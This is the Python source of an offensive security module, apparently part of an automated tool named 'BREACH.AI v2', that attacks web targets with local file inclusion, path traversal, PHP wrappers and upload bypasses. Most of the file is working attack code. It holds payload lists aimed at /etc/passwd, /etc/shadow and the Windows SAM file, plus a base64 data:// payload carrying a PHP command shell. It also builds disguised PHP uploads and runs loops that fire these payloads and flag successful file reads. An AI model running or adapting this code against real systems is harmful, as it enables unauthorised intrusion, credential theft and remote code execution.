"""
BREACH.AI v2 - File Attacker

Local File Inclusion (LFI), Remote File Inclusion (RFI), Path Traversal,
and File Upload bypass attacks.
"""

import asyncio
import base64
import re
from urllib.parse import urljoin, quote

from backend.breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from backend.breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# LFI/Path Traversal payloads
LFI_PAYLOADS = {
    "basic": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
    ],
    "windows": [
        "..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\windows\\win.ini",
        "../../../windows/win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "../../../windows/system32/config/sam",
        "C:\\Windows\\win.ini",
        "C:/Windows/win.ini",
    ],
    "encoded": [
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        "..%252f..%252f..%252fetc%252fpasswd",  # Double encoded
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "....//....//....//etc/passwd",  # Dot bypass
        "..;/..;/..;/etc/passwd",  # Semicolon bypass
        "..\\..\\..\\/etc/passwd",  # Mixed slashes
        "..%00/..%00/..%00/etc/passwd",  # Null byte
        "../../../etc/passwd%00.jpg",  # Null byte extension
        "../../../etc/passwd\x00.jpg",
    ],
    "php_wrappers": [
        "php://filter/convert.base64-encode/resource=index",
        "php://filter/convert.base64-encode/resource=config",
        "php://filter/convert.base64-encode/resource=../config",
        "php://filter/read=string.rot13/resource=index",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "file:///etc/passwd",
    ],
}

# File signatures that indicate successful LFI
FILE_SIGNATURES = {
    "etc_passwd": [
        r"root:x:0:0",
        r"nobody:x:",
        r"www-data:x:",
        r"daemon:x:",
        r"/bin/bash",
        r"/bin/sh",
    ],
    "etc_shadow": [
        r"root:\$[0-9a-z]+\$",
        r"\$6\$",  # SHA-512
        r"\$5\$",  # SHA-256
        r"\$1\$",  # MD5
    ],
    "windows_ini": [
        r"\[boot loader\]",
        r"\[fonts\]",
        r"\[extensions\]",
        r"MSDOS.SYS",
    ],
    "php_source": [
        r"<\?php",
        r"<\?=",
        r"function\s+\w+\s*\(",
        r"\$_GET\[",
        r"\$_POST\[",
    ],
    "proc_environ": [
        r"PATH=",
        r"HOME=",
        r"USER=",
        r"PWD=",
    ],
    "logs": [
        r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*GET",
        r"\[error\]",
        r"\[notice\]",
    ],
}

# File upload bypass techniques
UPLOAD_BYPASS = {
    "extensions": [
        ".php.jpg",
        ".php.png",
        ".php.gif",
        ".phtml",
        ".phar",
        ".php5",
        ".php7",
        ".phps",
        ".pht",
        ".pgif",
        ".shtml",
        ".htaccess",
        ".pHp",
        ".PhP",
        ".PHP",
        ".php%00.jpg",
        ".php\x00.jpg",
        ".php;.jpg",
    ],
    "content_types": [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/octet-stream",
    ],
    "magic_bytes": {
        "gif": b"GIF89a",
        "png": b"\x89PNG\r\n\x1a\n",
        "jpg": b"\xff\xd8\xff\xe0",
    },
}

# Common file inclusion endpoints
FILE_ENDPOINTS = [
    "/index.php",
    "/page.php",
    "/include.php",
    "/file.php",
    "/download.php",
    "/read.php",
    "/view.php",
    "/load.php",
    "/content.php",
    "/template.php",
    "/lang.php",
    "/language.php",
    "/module.php",
    "/static/",
    "/assets/",
    "/uploads/",
    "/files/",
    "/images/",
]

FILE_PARAMS = [
    "file", "page", "include", "path", "doc", "document",
    "folder", "root", "pg", "style", "pdf", "template",
    "php_path", "lang", "language", "dir", "src", "source",
    "conf", "config", "download", "read", "load", "view",
]


@register_module
class FileAttacker(InitialAccessModule):
    """
    File Attacker - LFI, RFI, Path Traversal, Upload Bypass.

    Techniques:
    - Local File Inclusion (LFI)
    - Path traversal (../)
    - PHP wrapper exploitation
    - Null byte injection
    - File upload bypass
    - Double encoding bypass
    """

    info = ModuleInfo(
        name="file_attacker",
        phase=BreachPhase.INITIAL_ACCESS,
        description="File inclusion and upload exploitation",
        author="BREACH.AI",
        techniques=["T1190", "T1083"],  # Exploit Public-Facing, File Discovery
        platforms=["web"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.ROOT,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if target might be vulnerable to file attacks."""
        return bool(config.target)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Execute file attack techniques."""
        self._start_execution()

        vulns = []
        target = config.target.rstrip("/")

        # Get endpoints from recon
        endpoints = config.chain_data.get("endpoints", FILE_ENDPOINTS)

        # Test LFI/Path Traversal
        lfi_vulns = await self._test_lfi(target, endpoints, config)
        vulns.extend(lfi_vulns)

        # Test PHP wrappers
        wrapper_vulns = await self._test_php_wrappers(target, endpoints, config)
        vulns.extend(wrapper_vulns)

        # Test file upload bypass
        upload_vulns = await self._test_upload_bypass(target, config)
        vulns.extend(upload_vulns)

        # Collect evidence
        for vuln in vulns:
            severity = Severity.CRITICAL if vuln.get("file_content") else Severity.HIGH

            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"File Attack: {vuln['type']} at {vuln['endpoint']}",
                content={
                    "endpoint": vuln["endpoint"],
                    "parameter": vuln.get("parameter", "N/A"),
                    "payload": vuln["payload"],
                    "file_type": vuln.get("file_type", "unknown"),
                    "content_preview": vuln.get("content", "")[:500],
                },
                proves=f"File system access via {vuln['type']}",
                severity=severity,
            )

        # Determine access level
        access_gained = None
        if any(v.get("file_type") == "etc_shadow" for v in vulns):
            access_gained = AccessLevel.ROOT
        elif any(v.get("file_type") in ["etc_passwd", "php_source"] for v in vulns):
            access_gained = AccessLevel.USER
        elif vulns:
            access_gained = AccessLevel.USER

        return self._create_result(
            success=len(vulns) > 0,
            action="file_attack",
            details=f"Found {len(vulns)} file inclusion/upload vulnerabilities",
            access_gained=access_gained,
            data_extracted={"file_vulns": vulns} if vulns else None,
            enables_modules=["credential_harvester", "linux_escalator"] if vulns else [],
        )

    async def _test_lfi(self, target: str, endpoints: list, config: ModuleConfig) -> list:
        """Test for Local File Inclusion."""
        vulns = []

        for endpoint in endpoints[:15]:
            url = urljoin(target, endpoint)

            for param in FILE_PARAMS[:10]:
                # Test basic payloads
                for payload in LFI_PAYLOADS["basic"][:6]:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = await self._safe_request("GET", test_url, timeout=10)

                    file_type = self._detect_file_content(response)
                    if file_type:
                        vulns.append({
                            "endpoint": endpoint,
                            "parameter": param,
                            "type": "lfi_basic",
                            "payload": payload,
                            "file_type": file_type,
                            "content": response.get("text", "")[:1000],
                            "file_content": True,
                        })
                        break  # Found LFI

                # Test encoded payloads
                for payload in LFI_PAYLOADS["encoded"][:4]:
                    test_url = f"{url}?{param}={payload}"
                    response = await self._safe_request("GET", test_url, timeout=10)

                    file_type = self._detect_file_content(response)
                    if file_type:
                        vulns.append({
                            "endpoint": endpoint,
                            "parameter": param,
                            "type": "lfi_encoded",
                            "payload": payload,
                            "file_type": file_type,
                            "content": response.get("text", "")[:1000],
                            "file_content": True,
                        })
                        break

                # Test Windows payloads
                for payload in LFI_PAYLOADS["windows"][:3]:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = await self._safe_request("GET", test_url, timeout=10)

                    file_type = self._detect_file_content(response)
                    if file_type:
                        vulns.append({
                            "endpoint": endpoint,
                            "parameter": param,
                            "type": "lfi_windows",
                            "payload": payload,
                            "file_type": file_type,
                            "content": response.get("text", "")[:1000],
                            "file_content": True,
                        })
                        break

        return vulns

    async def _test_php_wrappers(self, target: str, endpoints: list, config: ModuleConfig) -> list:
        """Test PHP wrapper exploitation."""
        vulns = []

        for endpoint in endpoints[:10]:
            if not endpoint.endswith(".php"):
                continue

            url = urljoin(target, endpoint)

            for param in FILE_PARAMS[:5]:
                for payload in LFI_PAYLOADS["php_wrappers"][:4]:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = await self._safe_request("GET", test_url, timeout=10)

                    if response:
                        text = response.get("text", "")

                        # Check for base64 encoded PHP source
                        if "php://filter" in payload and "convert.base64" in payload:
                            # Try to detect base64 content
                            if self._is_base64_content(text):
                                try:
                                    decoded = base64.b64decode(text).decode("utf-8", errors="ignore")
                                    if self._has_php_source(decoded):
                                        vulns.append({
                                            "endpoint": endpoint,
                                            "parameter": param,
                                            "type": "php_filter",
                                            "payload": payload,
                                            "file_type": "php_source",
                                            "content": decoded[:1000],
                                            "file_content": True,
                                        })
                                        break
                                except Exception:
                                    pass

                        # Check for data:// execution
                        if "data://" in payload:
                            file_type = self._detect_file_content(response)
                            if file_type:
                                vulns.append({
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "type": "data_wrapper_rce",
                                    "payload": payload,
                                    "file_type": file_type,
                                    "file_content": True,
                                })
                                break

        return vulns

    async def _test_upload_bypass(self, target: str, config: ModuleConfig) -> list:
        """Test file upload bypass techniques."""
        vulns = []

        upload_endpoints = [
            "/upload", "/api/upload", "/file/upload",
            "/api/files", "/api/images", "/api/media",
        ]

        for endpoint in upload_endpoints:
            url = urljoin(target, endpoint)

            # Test extension bypasses
            for ext in UPLOAD_BYPASS["extensions"][:5]:
                filename = f"test{ext}"

                # Create a minimal PHP payload with image magic bytes
                content = UPLOAD_BYPASS["magic_bytes"]["gif"] + b"<?php echo 'BREACHED'; ?>"

                for content_type in UPLOAD_BYPASS["content_types"][:2]:
                    # This is a simplified test - actual implementation would use multipart
                    response = await self._safe_request(
                        "POST",
                        url,
                        headers={"Content-Type": content_type},
                        data=content,
                        timeout=10,
                    )

                    if response and response.get("status_code") in [200, 201]:
                        # Check if upload was accepted
                        text = response.get("text", "").lower()
                        if any(kw in text for kw in ["success", "uploaded", "path", "url", "file"]):
                            vulns.append({
                                "endpoint": endpoint,
                                "type": "upload_bypass",
                                "payload": f"{filename} with {content_type}",
                                "file_type": "potential_rce",
                            })
                            break

        return vulns

    def _detect_file_content(self, response: dict) -> str:
        """Detect the type of file content in response."""
        if not response:
            return ""

        text = response.get("text", "")

        for file_type, patterns in FILE_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return file_type

        return ""

    def _is_base64_content(self, text: str) -> bool:
        """Check if text looks like base64 encoded content."""
        # Remove whitespace
        text = text.strip()

        # Check for base64 pattern
        if len(text) > 20:
            try:
                base64.b64decode(text)
                return True
            except Exception:
                pass

        return False

    def _has_php_source(self, text: str) -> bool:
        """Check if text contains PHP source code."""
        for pattern in FILE_SIGNATURES["php_source"]:
            if re.search(pattern, text):
                return True
        return False
